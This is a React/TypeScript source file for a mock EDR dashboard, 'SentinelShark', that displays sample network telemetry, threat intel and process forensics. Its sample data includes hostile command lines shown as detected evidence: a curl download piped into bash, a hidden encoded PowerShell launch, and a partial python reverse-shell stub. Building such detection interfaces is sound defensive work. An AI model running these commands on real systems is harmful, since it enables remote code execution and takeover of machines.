import { useState, useEffect, useRef } from "react";

// ── Color tokens ──────────────────────────────────────────────────────────────
const C = {
  bg: "#0D1117",
  surface: "#161B22",
  surfaceHover: "#1C2128",
  border: "#30363D",
  borderSubtle: "#21262D",
  accent: "#58A6FF",
  accentDim: "#1F3A5F",
  danger: "#F85149",
  dangerDim: "#3D1A1A",
  warning: "#D29922",
  warningDim: "#3D2E0A",
  safe: "#2EA043",
  safeDim: "#122A19",
  text: "#E6EDF3",
  textMuted: "#8B949E",
  textDimmer: "#484F58",
  high: "#FF7B72",
  medium: "#D29922",
  critical: "#F85149",
};

// ── Data ──────────────────────────────────────────────────────────────────────
type Severity = "critical" | "high" | "medium" | "safe";

interface Packet {
  id: number;
  time: string;
  src: string;
  dst: string;
  proto: string;
  port: number;
  len: number;
  pid: number;
  process: string;
  mitre: string;
  severity: Severity;
  info: string;
}

const PACKETS: Packet[] = [
  { id: 1, time: "09:14:03.021", src: "192.168.1.105", dst: "185.220.101.5", proto: "TCP", port: 443, len: 1480, pid: 4821, process: "curl", mitre: "T1071.001", severity: "critical", info: "Encrypted C2 beacon to Tor exit node" },
  { id: 2, time: "09:14:03.847", src: "185.220.101.5", dst: "192.168.1.105", proto: "TCP", port: 443, len: 892, pid: 4821, process: "curl", mitre: "T1059.004", severity: "critical", info: "Payload delivery — shell script download" },
  { id: 3, time: "09:14:05.112", src: "192.168.1.105", dst: "8.8.8.8", proto: "DNS", port: 53, len: 74, pid: 1832, process: "python3", mitre: "T1071.004", severity: "high", info: "DNS over HTTPS tunneling attempt" },
  { id: 4, time: "09:14:06.440", src: "192.168.1.105", dst: "91.92.109.198", proto: "TCP", port: 4444, len: 256, pid: 3304, process: "powershell.exe", mitre: "T1059.001", severity: "critical", info: "Reverse shell — non-standard port" },
  { id: 5, time: "09:14:08.001", src: "192.168.1.102", dst: "10.0.0.1", proto: "TCP", port: 22, len: 340, pid: 2100, process: "ssh", mitre: "T1021.004", severity: "medium", info: "Lateral movement via SSH" },
  { id: 6, time: "09:14:09.334", src: "192.168.1.105", dst: "142.250.80.46", proto: "HTTPS", port: 443, len: 528, pid: 981, process: "chrome", mitre: "T1567", severity: "medium", info: "Data exfiltration to cloud storage" },
  { id: 7, time: "09:14:10.882", src: "192.168.1.110", dst: "192.168.1.105", proto: "SMB", port: 445, len: 1024, pid: 672, process: "System", mitre: "T1021.002", severity: "high", info: "SMB lateral movement attempt" },
  { id: 8, time: "09:14:12.004", src: "192.168.1.105", dst: "cdn.example.com", proto: "HTTP", port: 80, len: 88, pid: 5501, process: "wget", mitre: "T1105", severity: "medium", info: "Ingress tool transfer" },
  { id: 9, time: "09:14:13.771", src: "192.168.1.103", dst: "10.0.0.50", proto: "TCP", port: 3389, len: 192, pid: 884, process: "mstsc.exe", mitre: "T1021.001", severity: "high", info: "RDP session to internal host" },
  { id: 10, time: "09:14:15.002", src: "192.168.1.105", dst: "1.1.1.1", proto: "DNS", port: 53, len: 66, pid: 450, process: "systemd-resolved", mitre: "", severity: "safe", info: "Normal DNS resolution" },
  { id: 11, time: "09:14:16.445", src: "192.168.1.108", dst: "185.220.101.5", proto: "TCP", port: 9001, len: 512, pid: 7711, process: "python3", mitre: "T1090.003", severity: "critical", info: "Tor proxy traffic detected" },
  { id: 12, time: "09:14:18.103", src: "192.168.1.105", dst: "s3.amazonaws.com", proto: "HTTPS", port: 443, len: 2048, pid: 981, process: "aws-cli", mitre: "T1537", severity: "high", info: "Cloud storage exfiltration" },
];

const MITRE_BREAKDOWN = [
  { tag: "T1071", name: "App Layer Protocol", count: 14, severity: "critical" as Severity },
  { tag: "T1059", name: "Command & Scripting", count: 11, severity: "critical" as Severity },
  { tag: "T1021", name: "Remote Services", count: 9, severity: "high" as Severity },
  { tag: "T1090", name: "Proxy", count: 7, severity: "high" as Severity },
  { tag: "T1567", name: "Exfil Over Web", count: 5, severity: "medium" as Severity },
  { tag: "T1105", name: "Ingress Transfer", count: 4, severity: "medium" as Severity },
];

const TOP_PROCESSES = [
  { name: "curl", count: 34, severity: "critical" as Severity },
  { name: "powershell.exe", count: 28, severity: "critical" as Severity },
  { name: "python3", count: 19, severity: "high" as Severity },
  { name: "mstsc.exe", count: 12, severity: "high" as Severity },
  { name: "wget", count: 8, severity: "medium" as Severity },
  { name: "chrome", count: 5, severity: "medium" as Severity },
];

const SEVERITY_DIST = [
  { label: "Critical", count: 24, color: C.danger },
  { label: "High", count: 38, color: C.high },
  { label: "Medium", count: 51, color: C.warning },
  { label: "Low", count: 103, color: C.safe },
];

// ── Helpers ───────────────────────────────────────────────────────────────────
function severityColors(s: Severity) {
  switch (s) {
    case "critical": return { bg: C.dangerDim, text: C.danger, border: "#5A1E1E" };
    case "high": return { bg: "#2D1F1A", text: C.high, border: "#4A2A20" };
    case "medium": return { bg: C.warningDim, text: C.warning, border: "#5A4010" };
    case "safe": return { bg: C.safeDim, text: C.safe, border: "#1A4025" };
  }
}

function SeverityPill({ s }: { s: Severity }) {
  const col = severityColors(s);
  return (
    <span
      className="mono"
      style={{
        fontSize: 10, fontWeight: 600, letterSpacing: "0.06em",
        padding: "2px 7px", borderRadius: 3,
        background: col.bg, color: col.text,
        border: `1px solid ${col.border}`,
        textTransform: "uppercase",
      }}
    >
      {s}
    </span>
  );
}

function MitreTag({ tag }: { tag: string }) {
  if (!tag) return <span style={{ color: C.textDimmer, fontSize: 11 }}>—</span>;
  return (
    <span
      className="mono"
      style={{
        fontSize: 10, fontWeight: 600,
        padding: "2px 6px", borderRadius: 3,
        background: C.accentDim, color: C.accent,
        border: `1px solid #2A4A7A`,
        letterSpacing: "0.04em",
      }}
    >
      {tag}
    </span>
  );
}

function CopyBtn({ value, label = "Copy" }: { value: string; label?: string }) {
  const [copied, setCopied] = useState(false);
  return (
    <button
      onClick={() => { navigator.clipboard.writeText(value); setCopied(true); setTimeout(() => setCopied(false), 1500); }}
      style={{
        fontSize: 10, fontWeight: 600, letterSpacing: "0.05em",
        padding: "2px 8px", borderRadius: 3,
        background: "transparent", color: copied ? C.safe : C.accent,
        border: `1px solid ${copied ? C.safe : C.border}`,
        cursor: "pointer", transition: "all 0.15s",
        fontFamily: "inherit",
      }}
    >
      {copied ? "✓ Copied" : label}
    </button>
  );
}

function PanelHeader({ children, icon }: { children: React.ReactNode; icon?: string }) {
  return (
    <div style={{
      display: "flex", alignItems: "center", gap: 8,
      padding: "8px 14px",
      borderBottom: `1px solid ${C.border}`,
      background: C.surface,
    }}>
      {icon && <span style={{ fontSize: 12 }}>{icon}</span>}
      <span style={{ fontSize: 11, fontWeight: 700, letterSpacing: "0.08em", textTransform: "uppercase", color: C.textMuted }}>
        {children}
      </span>
    </div>
  );
}

function CollapsibleSection({ title, icon, children, defaultOpen = true }: {
  title: string; icon: string; children: React.ReactNode; defaultOpen?: boolean;
}) {
  const [open, setOpen] = useState(defaultOpen);
  return (
    <div style={{ borderBottom: `1px solid ${C.borderSubtle}` }}>
      <button
        onClick={() => setOpen(!open)}
        style={{
          width: "100%", display: "flex", alignItems: "center", justifyContent: "space-between",
          padding: "8px 14px", background: "transparent", border: "none",
          cursor: "pointer", color: C.text,
        }}
      >
        <span style={{ display: "flex", alignItems: "center", gap: 7, fontSize: 11, fontWeight: 700, letterSpacing: "0.07em", textTransform: "uppercase", color: C.textMuted }}>
          <span>{icon}</span> {title}
        </span>
        <span style={{ color: C.textDimmer, fontSize: 10, transform: open ? "rotate(180deg)" : "rotate(0deg)", transition: "transform 0.15s" }}>▼</span>
      </button>
      {open && <div style={{ padding: "0 14px 12px" }}>{children}</div>}
    </div>
  );
}

function MiniBar({ value, max, color }: { value: number; max: number; color: string }) {
  return (
    <div style={{ flex: 1, height: 4, background: C.borderSubtle, borderRadius: 2, overflow: "hidden" }}>
      <div style={{ width: `${(value / max) * 100}%`, height: "100%", background: color, borderRadius: 2 }} />
    </div>
  );
}

// ── Live clock ────────────────────────────────────────────────────────────────
function LiveClock() {
  const [t, setT] = useState(() => new Date());
  useEffect(() => { const id = setInterval(() => setT(new Date()), 1000); return () => clearInterval(id); }, []);
  return (
    <span className="mono" style={{ fontSize: 11, color: C.textMuted }}>
      {t.toUTCString().slice(17, 25)} UTC
    </span>
  );
}

// ── Packet counter ────────────────────────────────────────────────────────────
function LivePacketCount() {
  const [count, setCount] = useState(12847);
  useEffect(() => {
    const id = setInterval(() => setCount(c => c + Math.floor(Math.random() * 8 + 1)), 800);
    return () => clearInterval(id);
  }, []);
  return (
    <span className="mono" style={{ color: C.accent, fontSize: 11 }}>
      {count.toLocaleString()} pkts
    </span>
  );
}

// ── Main component ────────────────────────────────────────────────────────────
export default function App() {
  const [selectedRow, setSelectedRow] = useState<Packet>(PACKETS[0]);
  const [filterSeverity, setFilterSeverity] = useState<Severity | "all">("all");
  const [filterProto, setFilterProto] = useState("all");
  const [toastMsg, setToastMsg] = useState<string | null>(null);
  const toastRef = useRef<ReturnType<typeof setTimeout> | null>(null);

  const filtered = PACKETS.filter(p =>
    (filterSeverity === "all" || p.severity === filterSeverity) &&
    (filterProto === "all" || p.proto === filterProto)
  );

  const protos = Array.from(new Set(PACKETS.map(p => p.proto)));

  function showToast(msg: string) {
    setToastMsg(msg);
    if (toastRef.current) clearTimeout(toastRef.current);
    toastRef.current = setTimeout(() => setToastMsg(null), 3000);
  }

  const s = selectedRow;
  const sc = severityColors(s.severity);
  const totalDist = SEVERITY_DIST.reduce((a, b) => a + b.count, 0);

  return (
    <div style={{
      width: "100%", height: "100%", display: "flex", flexDirection: "column",
      background: C.bg, color: C.text, fontFamily: "Inter, system-ui, sans-serif",
      fontSize: 13, overflow: "hidden", position: "relative",
    }}>
      {/* ── Titlebar ─────────────────────────────────────────────────────────── */}
      <div style={{
        height: 40, display: "flex", alignItems: "center",
        padding: "0 16px",
        background: C.surface,
        borderBottom: `1px solid ${C.border}`,
        gap: 0, flexShrink: 0,
      }}>
        {/* Logo */}
        <div style={{ display: "flex", alignItems: "center", gap: 10, marginRight: 24 }}>
          <svg width="22" height="22" viewBox="0 0 22 22" fill="none">
            <path d="M11 2L20 7V15L11 20L2 15V7L11 2Z" stroke={C.accent} strokeWidth="1.5" fill="none" />
            <path d="M11 6L16 9V13L11 16L6 13V9L11 6Z" fill={C.accent} fillOpacity="0.2" stroke={C.accent} strokeWidth="1" />
            <circle cx="11" cy="11" r="2" fill={C.accent} />
          </svg>
          <span style={{ fontWeight: 700, fontSize: 13, letterSpacing: "0.04em", color: C.text }}>
            SENTINEL<span style={{ color: C.accent }}>SHARK</span>
          </span>
          <span style={{
            fontSize: 9, fontWeight: 700, letterSpacing: "0.08em",
            padding: "1px 5px", borderRadius: 2,
            background: C.accentDim, color: C.accent, border: `1px solid ${C.accent}22`,
          }}>EDR</span>
        </div>

        {/* Nav tabs */}
        {["Overview", "Detections", "Endpoints", "Hunt", "Intel", "Settings"].map((tab, i) => (
          <button
            key={tab}
            style={{
              padding: "0 14px", height: 40, background: "transparent",
              border: "none", borderBottom: i === 0 ? `2px solid ${C.accent}` : "2px solid transparent",
              color: i === 0 ? C.accent : C.textMuted,
              fontSize: 11, fontWeight: i === 0 ? 600 : 400, letterSpacing: "0.04em",
              cursor: "pointer", transition: "color 0.15s",
            }}
          >
            {tab}
          </button>
        ))}

        <div style={{ flex: 1 }} />

        {/* Status indicators */}
        <div style={{ display: "flex", alignItems: "center", gap: 16 }}>
          <div style={{ display: "flex", alignItems: "center", gap: 5 }}>
            <div className="pulse-dot" style={{ width: 6, height: 6, borderRadius: "50%", background: C.danger }} />
            <span style={{ fontSize: 10, fontWeight: 600, color: C.danger, letterSpacing: "0.06em" }}>3 CRITICAL</span>
          </div>
          <div style={{ width: 1, height: 16, background: C.border }} />
          <LivePacketCount />
          <div style={{ width: 1, height: 16, background: C.border }} />
          <LiveClock />
          <div style={{ width: 1, height: 16, background: C.border }} />
          <div style={{ display: "flex", alignItems: "center", gap: 5 }}>
            <div style={{ width: 6, height: 6, borderRadius: "50%", background: C.safe }} />
            <span style={{ fontSize: 10, color: C.safe }}>SENSOR ONLINE</span>
          </div>
        </div>
      </div>

      {/* ── Main 3-panel layout ───────────────────────────────────────────────── */}
      <div style={{ flex: 1, display: "flex", flexDirection: "column", overflow: "hidden" }}>

        {/* TOP: Packet / Telemetry Table */}
        <div style={{
          flex: "0 0 45%",
          display: "flex", flexDirection: "column",
          borderBottom: `1px solid ${C.border}`,
          overflow: "hidden",
        }}>
          {/* Table toolbar */}
          <div style={{
            display: "flex", alignItems: "center", gap: 8, padding: "6px 12px",
            background: C.surface, borderBottom: `1px solid ${C.border}`, flexShrink: 0,
          }}>
            <span style={{ fontSize: 10, fontWeight: 700, letterSpacing: "0.08em", textTransform: "uppercase", color: C.textMuted, marginRight: 4 }}>
              🦈 Live Telemetry
            </span>
            <div style={{ width: 1, height: 14, background: C.border }} />
            {/* Severity filter */}
            {(["all", "critical", "high", "medium", "safe"] as const).map(sv => {
              const col = sv === "all" ? C.textMuted : severityColors(sv).text;
              return (
                <button
                  key={sv}
                  onClick={() => setFilterSeverity(sv)}
                  style={{
                    fontSize: 10, fontWeight: 600, letterSpacing: "0.06em",
                    padding: "2px 8px", borderRadius: 3,
                    background: filterSeverity === sv ? (sv === "all" ? C.borderSubtle : severityColors(sv as Severity).bg) : "transparent",
                    color: filterSeverity === sv ? col : C.textDimmer,
                    border: `1px solid ${filterSeverity === sv ? (sv === "all" ? C.border : severityColors(sv as Severity).border) : "transparent"}`,
                    cursor: "pointer", textTransform: "uppercase",
                  }}
                >
                  {sv}
                </button>
              );
            })}
            <div style={{ width: 1, height: 14, background: C.border, marginLeft: 4 }} />
            {/* Proto filter */}
            {["all", ...protos].map(pr => (
              <button
                key={pr}
                onClick={() => setFilterProto(pr)}
                style={{
                  fontSize: 10, fontWeight: 500, padding: "2px 7px", borderRadius: 3,
                  background: filterProto === pr ? C.accentDim : "transparent",
                  color: filterProto === pr ? C.accent : C.textDimmer,
                  border: `1px solid ${filterProto === pr ? "#2A4A7A" : "transparent"}`,
                  cursor: "pointer",
                }}
              >
                {pr.toUpperCase()}
              </button>
            ))}
            <div style={{ flex: 1 }} />
            <span className="mono" style={{ fontSize: 10, color: C.textDimmer }}>{filtered.length} events</span>
          </div>

          {/* Table */}
          <div style={{ flex: 1, overflowY: "auto" }}>
            <table style={{ width: "100%", borderCollapse: "collapse", fontSize: 11 }}>
              <thead>
                <tr style={{ background: C.surface, position: "sticky", top: 0, zIndex: 1 }}>
                  {["Time", "Src IP", "Dst IP", "Proto", "Port", "Len", "PID", "Process", "MITRE Tag", "Severity", "Info"].map(h => (
                    <th
                      key={h}
                      style={{
                        padding: "5px 10px", textAlign: "left",
                        fontSize: 9, fontWeight: 700, letterSpacing: "0.08em",
                        color: C.textMuted, textTransform: "uppercase",
                        borderBottom: `1px solid ${C.border}`,
                        whiteSpace: "nowrap",
                      }}
                    >
                      {h}
                    </th>
                  ))}
                </tr>
              </thead>
              <tbody>
                {filtered.map((p) => {
                  const sc = severityColors(p.severity);
                  const isSelected = p.id === selectedRow.id;
                  return (
                    <tr
                      key={p.id}
                      onClick={() => setSelectedRow(p)}
                      style={{
                        background: isSelected
                          ? `${sc.bg}CC`
                          : p.severity === "critical" ? `${C.dangerDim}55`
                            : p.severity === "high" ? "#2D1F1A44"
                              : "transparent",
                        borderLeft: isSelected ? `3px solid ${sc.text}` : "3px solid transparent",
                        borderBottom: `1px solid ${C.borderSubtle}`,
                        cursor: "pointer",
                        transition: "background 0.1s",
                      }}
                    >
                      <td className="mono" style={{ padding: "5px 10px", color: C.textMuted, whiteSpace: "nowrap", fontSize: 10 }}>{p.time}</td>
                      <td className="mono" style={{ padding: "5px 10px", color: C.text, whiteSpace: "nowrap", fontSize: 10 }}>{p.src}</td>
                      <td className="mono" style={{ padding: "5px 10px", color: p.severity === "critical" ? C.danger : C.text, whiteSpace: "nowrap", fontSize: 10 }}>{p.dst}</td>
                      <td className="mono" style={{ padding: "5px 10px", color: C.accent, fontSize: 10 }}>{p.proto}</td>
                      <td className="mono" style={{ padding: "5px 10px", color: C.textMuted, fontSize: 10 }}>{p.port}</td>
                      <td className="mono" style={{ padding: "5px 10px", color: C.textDimmer, fontSize: 10 }}>{p.len}</td>
                      <td className="mono" style={{ padding: "5px 10px", color: C.accent, fontSize: 10 }}>{p.pid}</td>
                      <td className="mono" style={{ padding: "5px 10px", fontSize: 10 }}>
                        <span style={{
                          padding: "1px 6px", borderRadius: 3, fontSize: 10,
                          background: p.severity === "critical" ? C.dangerDim : C.borderSubtle,
                          color: p.severity === "critical" ? C.danger : p.severity === "high" ? C.high : C.text,
                          border: `1px solid ${p.severity === "critical" ? "#5A1E1E" : C.borderSubtle}`,
                        }}>{p.process}</span>
                      </td>
                      <td style={{ padding: "5px 10px" }}><MitreTag tag={p.mitre} /></td>
                      <td style={{ padding: "5px 10px" }}><SeverityPill s={p.severity} /></td>
                      <td style={{ padding: "5px 10px", color: C.textMuted, fontSize: 10, maxWidth: 220, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>{p.info}</td>
                    </tr>
                  );
                })}
              </tbody>
            </table>
          </div>
        </div>

        {/* BOTTOM: 3 panels */}
        <div style={{ flex: 1, display: "flex", overflow: "hidden", minHeight: 0 }}>

          {/* Bottom-Left: Inspection Panel */}
          <div style={{
            width: 380, flexShrink: 0,
            borderRight: `1px solid ${C.border}`,
            display: "flex", flexDirection: "column",
            overflow: "hidden",
          }}>
            <PanelHeader icon="🔍">Packet Inspection</PanelHeader>
            <div style={{ flex: 1, overflowY: "auto" }}>

              {/* Section 1: Threat Intel */}
              <CollapsibleSection title="Threat Intel Summary" icon="🌐">
                <div style={{ display: "flex", flexDirection: "column", gap: 8, paddingTop: 4 }}>

                  {/* IP header */}
                  <div style={{
                    display: "flex", alignItems: "center", justifyContent: "space-between",
                    padding: "8px 10px",
                    background: s.severity === "critical" ? C.dangerDim : C.borderSubtle,
                    borderRadius: 4, border: `1px solid ${s.severity === "critical" ? "#5A1E1E" : C.border}`,
                  }}>
                    <div>
                      <div className="mono" style={{ fontSize: 13, fontWeight: 600, color: sc.text }}>{s.dst}</div>
                      <div style={{ fontSize: 10, color: C.textMuted, marginTop: 2 }}>Target IP — Port {s.port}</div>
                    </div>
                    <SeverityPill s={s.severity} />
                  </div>

                  {/* Intel rows */}
                  {[
                    { label: "AbuseIPDB Score", value: s.severity === "critical" ? "97 / 100 🔴" : s.severity === "high" ? "72 / 100 🟠" : "12 / 100 🟢", mono: true },
                    { label: "VirusTotal Hits", value: s.severity === "critical" ? "48 / 73 engines" : s.severity === "high" ? "22 / 73 engines" : "0 / 73 engines", mono: true },
                    { label: "Geolocation", value: s.severity === "critical" ? "🇷🇺 Moscow, RU (AS44050)" : s.severity === "high" ? "🇨🇳 Beijing, CN (AS4134)" : "🇺🇸 Mountain View, US", mono: false },
                    { label: "ISP / ASN", value: s.severity === "critical" ? "Petersburg Internet Network" : "Google LLC", mono: false },
                    { label: "Known Tags", value: s.severity === "critical" ? "C2, TorExitNode, Malware" : s.severity === "high" ? "Scanner, BruteForce" : "CDN, Safe", mono: false },
                    { label: "First Seen", value: "2024-03-11", mono: true },
                  ].map(row => (
                    <div key={row.label} style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", gap: 8 }}>
                      <span style={{ fontSize: 10, color: C.textMuted, whiteSpace: "nowrap", paddingTop: 1 }}>{row.label}</span>
                      <span className={row.mono ? "mono" : ""} style={{ fontSize: 10, color: C.text, textAlign: "right" }}>{row.value}</span>
                    </div>
                  ))}
                </div>
              </CollapsibleSection>

              {/* Section 2: Host & Process Forensics */}
              <CollapsibleSection title="Host & Process Forensics" icon="🖥️">
                <div style={{ display: "flex", flexDirection: "column", gap: 10, paddingTop: 4 }}>

                  {/* Command line */}
                  <div>
                    <div style={{ fontSize: 9, fontWeight: 700, letterSpacing: "0.08em", textTransform: "uppercase", color: C.textMuted, marginBottom: 4 }}>Command Line</div>
                    <div className="mono" style={{
                      fontSize: 10, padding: "6px 8px", borderRadius: 4,
                      background: "#0A0E13", border: `1px solid ${C.border}`,
                      color: C.danger, wordBreak: "break-all", lineHeight: 1.6,
                    }}>
                      {s.process === "curl"
                        ? "curl -s http://185.220.101.5/stage2.sh | bash"
                        : s.process === "powershell.exe"
                          ? "powershell -nop -w hidden -enc JABjAGwAaQBlAG4AdA..."
                          : s.process === "python3"
                            ? "python3 -c \"import socket,subprocess,os;...\""
                            : `${s.process} -connect ${s.dst}:${s.port}`}
                    </div>
                  </div>

                  {/* Exe path */}
                  <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", gap: 8 }}>
                    <span style={{ fontSize: 9, fontWeight: 700, letterSpacing: "0.08em", textTransform: "uppercase", color: C.textMuted, whiteSpace: "nowrap" }}>Executable Path</span>
                    <span className="mono" style={{ fontSize: 10, color: C.textMuted }}>
                      {s.process === "powershell.exe" ? "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" : `/usr/bin/${s.process}`}
                    </span>
                  </div>

                  {/* SHA-256 */}
                  <div>
                    <div style={{ fontSize: 9, fontWeight: 700, letterSpacing: "0.08em", textTransform: "uppercase", color: C.textMuted, marginBottom: 4 }}>File SHA-256</div>
                    <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
                      <span className="mono" style={{
                        fontSize: 9, color: C.textMuted, flex: 1,
                        overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap",
                      }}>
                        a3f8c2e1d94b7f0e5c2a1b8d3e6f9a2c4b7d0e3f6a9c2e5b8d1f4a7c0e3b6d9
                      </span>
                      <CopyBtn value="a3f8c2e1d94b7f0e5c2a1b8d3e6f9a2c4b7d0e3f6a9c2e5b8d1f4a7c0e3b6d9" />
                      <button
                        onClick={() => showToast("Opening VirusTotal...")}
                        style={{
                          fontSize: 10, fontWeight: 600,
                          padding: "2px 8px", borderRadius: 3,
                          background: "transparent", color: C.warning,
                          border: `1px solid ${C.border}`,
                          cursor: "pointer", fontFamily: "inherit",
                        }}
                      >VT Check</button>
                    </div>
                  </div>

                  {/* Parent process lineage */}
                  <div>
                    <div style={{ fontSize: 9, fontWeight: 700, letterSpacing: "0.08em", textTransform: "uppercase", color: C.textMuted, marginBottom: 6 }}>Process Lineage</div>
                    <div style={{ display: "flex", alignItems: "center", gap: 6, flexWrap: "wrap" }}>
                      {[
                        { name: "systemd", pid: 1 },
                        { name: "bash", pid: 1024 },
                        { name: s.process, pid: s.pid },
                      ].map((proc, i, arr) => (
                        <div key={i} style={{ display: "flex", alignItems: "center", gap: 6 }}>
                          <div style={{
                            display: "flex", alignItems: "center", gap: 4,
                            padding: "3px 8px", borderRadius: 4,
                            background: i === arr.length - 1 ? sc.bg : C.borderSubtle,
                            border: `1px solid ${i === arr.length - 1 ? sc.border : C.border}`,
                          }}>
                            <span className="mono" style={{ fontSize: 10, color: i === arr.length - 1 ? sc.text : C.text }}>{proc.name}</span>
                            <span className="mono" style={{ fontSize: 9, color: C.textDimmer }}>PID {proc.pid}</span>
                          </div>
                          {i < arr.length - 1 && <span style={{ color: C.textDimmer, fontSize: 10 }}>→</span>}
                        </div>
                      ))}
                    </div>
                  </div>

                  {/* User / Privilege */}
                  <div style={{ display: "flex", gap: 12 }}>
                    <div style={{ flex: 1 }}>
                      <div style={{ fontSize: 9, fontWeight: 700, letterSpacing: "0.08em", textTransform: "uppercase", color: C.textMuted, marginBottom: 4 }}>User</div>
                      <span className="mono" style={{
                        fontSize: 11, fontWeight: 600,
                        padding: "2px 8px", borderRadius: 3,
                        background: C.dangerDim, color: C.danger,
                        border: `1px solid #5A1E1E`,
                      }}>root</span>
                    </div>
                    <div style={{ flex: 1 }}>
                      <div style={{ fontSize: 9, fontWeight: 700, letterSpacing: "0.08em", textTransform: "uppercase", color: C.textMuted, marginBottom: 4 }}>Privilege</div>
                      <span className="mono" style={{
                        fontSize: 11, fontWeight: 600,
                        padding: "2px 8px", borderRadius: 3,
                        background: C.dangerDim, color: C.danger,
                        border: `1px solid #5A1E1E`,
                      }}>SYSTEM / Admin</span>
                    </div>
                  </div>

                  {/* Endpoint info */}
                  <div style={{
                    padding: "8px 10px", borderRadius: 4,
                    background: C.borderSubtle, border: `1px solid ${C.border}`,
                    display: "flex", gap: 16,
                  }}>
                    {[
                      { label: "Hostname", value: "WORKSTATION-07" },
                      { label: "OS", value: "Ubuntu 22.04" },
                      { label: "Agent", value: "v2.4.1" },
                    ].map(item => (
                      <div key={item.label}>
                        <div style={{ fontSize: 9, color: C.textDimmer, textTransform: "uppercase", letterSpacing: "0.06em" }}>{item.label}</div>
                        <div className="mono" style={{ fontSize: 10, color: C.text, marginTop: 2 }}>{item.value}</div>
                      </div>
                    ))}
                  </div>
                </div>
              </CollapsibleSection>

            </div>
          </div>

          {/* Bottom-Center: Event detail + Action bar */}
          <div style={{
            flex: 1, display: "flex", flexDirection: "column",
            borderRight: `1px solid ${C.border}`,
            overflow: "hidden", minWidth: 0,
          }}>
            <PanelHeader icon="📋">Detection Detail</PanelHeader>

            <div style={{ flex: 1, overflowY: "auto", padding: "12px 16px" }}>
              {/* Alert header */}
              <div style={{
                padding: "10px 14px", borderRadius: 6,
                background: s.severity === "critical" ? C.dangerDim : s.severity === "high" ? "#2D1F1A" : C.warningDim,
                border: `1px solid ${sc.border}`,
                marginBottom: 14,
              }}>
                <div style={{ display: "flex", alignItems: "flex-start", justifyContent: "space-between", gap: 12 }}>
                  <div>
                    <div style={{ fontSize: 12, fontWeight: 700, color: sc.text, marginBottom: 4 }}>
                      {s.severity === "critical" ? "⚠ CRITICAL THREAT DETECTED" : s.severity === "high" ? "⚡ HIGH SEVERITY EVENT" : "ℹ MEDIUM SEVERITY EVENT"}
                    </div>
                    <div style={{ fontSize: 11, color: C.text, lineHeight: 1.5 }}>{s.info}</div>
                  </div>
                  <MitreTag tag={s.mitre} />
                </div>
                <div style={{ display: "flex", gap: 16, marginTop: 10, paddingTop: 8, borderTop: `1px solid ${sc.border}` }}>
                  {[
                    { label: "Time", value: s.time },
                    { label: "Src", value: s.src },
                    { label: "Dst", value: s.dst },
                    { label: "Proto", value: s.proto },
                    { label: "Port", value: String(s.port) },
                  ].map(item => (
                    <div key={item.label}>
                      <div style={{ fontSize: 9, color: C.textDimmer, textTransform: "uppercase", letterSpacing: "0.06em" }}>{item.label}</div>
                      <div className="mono" style={{ fontSize: 10, color: C.text, marginTop: 2 }}>{item.value}</div>
                    </div>
                  ))}
                </div>
              </div>

              {/* UDM JSON preview */}
              <div style={{ marginBottom: 12 }}>
                <div style={{ fontSize: 9, fontWeight: 700, letterSpacing: "0.08em", textTransform: "uppercase", color: C.textMuted, marginBottom: 6 }}>
                  UDM Event JSON
                </div>
                <div className="mono" style={{
                  fontSize: 9, padding: "10px 12px",
                  background: "#080C11", border: `1px solid ${C.border}`,
                  borderRadius: 4, color: C.textMuted, lineHeight: 1.7,
                  whiteSpace: "pre",
                }}>
{`{
  "metadata": {
    "event_timestamp": "${s.time}",
    "event_type": "NETWORK_CONNECTION",
    "product_name": "SentinelShark"
  },
  "principal": {
    "ip": "${s.src}",
    "process": {
      "pid": ${s.pid},
      "file": { "full_path": "/usr/bin/${s.process}" },
      "command_line": "${s.process} -s ${s.dst}"
    }
  },
  "target": { "ip": "${s.dst}", "port": ${s.port} },
  "network": { "application_protocol": "${s.proto}" },
  "security_result": {
    "severity": "${s.severity.toUpperCase()}",
    "threat_name": "${s.mitre || "UNKNOWN"}",
    "summary": "${s.info}"
  }
}`}
                </div>
              </div>

              {/* Related alerts */}
              <div>
                <div style={{ fontSize: 9, fontWeight: 700, letterSpacing: "0.08em", textTransform: "uppercase", color: C.textMuted, marginBottom: 6 }}>
                  Related Alerts (last 24h)
                </div>
                <div style={{ display: "flex", flexDirection: "column", gap: 4 }}>
                  {[
                    { time: "08:52", desc: "Same process spawned suspicious child", sev: "high" as Severity },
                    { time: "08:41", desc: "Persistence via cron job added", sev: "critical" as Severity },
                    { time: "07:13", desc: "First connection to this external IP", sev: "medium" as Severity },
                  ].map((a, i) => {
                    const ac = severityColors(a.sev);
                    return (
                      <div key={i} style={{
                        display: "flex", alignItems: "center", gap: 10,
                        padding: "5px 8px", borderRadius: 3,
                        background: C.borderSubtle, border: `1px solid ${C.border}`,
                      }}>
                        <span className="mono" style={{ fontSize: 9, color: C.textDimmer, whiteSpace: "nowrap" }}>{a.time}</span>
                        <span style={{ fontSize: 10, color: C.textMuted, flex: 1 }}>{a.desc}</span>
                        <SeverityPill s={a.sev} />
                      </div>
                    );
                  })}
                </div>
              </div>
            </div>

            {/* ── Action Bar ──────────────────────────────────────────────────── */}
            <div style={{
              padding: "10px 14px",
              background: C.surface,
              borderTop: `1px solid ${C.border}`,
              display: "flex", gap: 8, alignItems: "center", flexWrap: "wrap",
            }}>
              <span style={{ fontSize: 9, fontWeight: 700, letterSpacing: "0.08em", textTransform: "uppercase", color: C.textDimmer, marginRight: 4 }}>
                IR Actions
              </span>

              <button
                onClick={() => showToast(`⛔ Kill Process signal sent to PID ${s.pid} (${s.process})`)}
                style={{
                  display: "flex", alignItems: "center", gap: 5,
                  padding: "6px 14px", borderRadius: 4,
                  background: C.dangerDim, color: C.danger,
                  border: `1px solid ${C.danger}60`,
                  fontSize: 11, fontWeight: 700, cursor: "pointer",
                  transition: "all 0.15s", fontFamily: "inherit",
                  letterSpacing: "0.02em",
                }}
              >
                ⛔ Kill Process
              </button>

              <button
                onClick={() => showToast(`🛡️ Block rule created for ${s.dst}`)}
                style={{
                  display: "flex", alignItems: "center", gap: 5,
                  padding: "6px 14px", borderRadius: 4,
                  background: C.warningDim, color: C.warning,
                  border: `1px solid ${C.warning}60`,
